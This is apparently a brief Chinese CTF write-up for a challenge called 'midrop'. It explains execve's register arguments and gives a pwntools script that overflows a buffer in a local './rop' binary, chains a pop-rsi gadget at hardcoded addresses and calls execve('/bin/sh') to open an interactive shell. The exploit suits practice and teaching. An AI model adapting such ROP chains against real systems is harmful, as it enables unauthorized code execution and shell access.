# midrop

execve()接受三个参数，path放在rdi，argv[]放在rsi，envp[]放在edx  

现在要使execve('/bin/sh', 0, 0)

```python
import pwn

pwn.context(arch='amd64', os='linux', log_level='debug')

p = pwn.process('./rop')
e = pwn.ELF('./rop')

execve_addr = pwn.p64(0x4006F6)     # lea mm %edi ; call _execve

payload1 = b'A' * 16 + b'/bin/sh\x00'
p.sendlineafter(b'who are you?', payload1)

# ROPgadget --binary rop | grep 'pop'
pop_rsi_r15_addr = pwn.p64(0x400811)    # pop rsi ; pop r15 ; ret

payload2 = b'A' * 8 + b'B' * 8 + pop_rsi_r15_addr + pwn.p64(0) + pwn.p64(0) + execve_addr
p.sendlineafter(b'if you want to do?', payload2)

p.recv()
p.interactive()
```